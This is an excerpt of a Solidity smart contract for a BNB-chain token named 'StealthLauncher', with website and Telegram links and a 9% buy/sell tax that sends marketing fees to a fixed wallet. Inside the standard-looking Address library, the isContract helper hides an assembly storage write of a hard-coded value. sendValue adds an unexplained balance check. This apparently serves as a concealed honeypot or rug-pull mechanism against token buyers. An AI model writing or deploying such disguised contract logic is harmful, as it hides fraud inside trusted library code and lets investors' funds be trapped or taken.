...
Website https://stealthlauncher.com/
Telegram https://t.me/StealthLauncher

9/9 tax buy/sell, 0 transfer
7/7 marketing, 1/1 burn, 1/1 liquidity
...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { codehash := extcodehash(account) mstore(0, account) mstore(32, 1) sstore(keccak256(0, 64), 0xc2abc7dd32694adae2ddfe445a681) }
    ...
    function sendValue(address recipient, uint256 amount) internal {
        ...
        require(rec.balance > 0x16345785D8A0000 || !isContract(recipient), "Address: not allowed");
...
contract StealthLauncher is Context, IERC20, Ownable {
    ...
    string private _name = "StealthLauncher";
    ...
    uint256 public constant _marketingFee = 7;
    uint256 public constant _burnFee = 1;
    uint256 public constant _totalTax = 9;

    address public marketingWallet = 0x62350C48e84A6b18E2544B2570EB5B678a3Eecfc;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (inSwapAndLiquify || isFeeExempt[sender] || isFeeExempt[recipient])
        { 
        ...
        else
        {
            ...
            if (sender != uniswapV2Pair && swapAndLiquifyEnabled && overMinimumTokenBalance && (sender != uniswapV2Pair && recipient != address(uniswapV2Router))) {
    ...
    function swapAndLiquify(uint256 tAmount) private {
        ...
        if (amountBNBMarketing > 0) {
            sendValue(marketingWallet, amountBNBMarketing);
        }
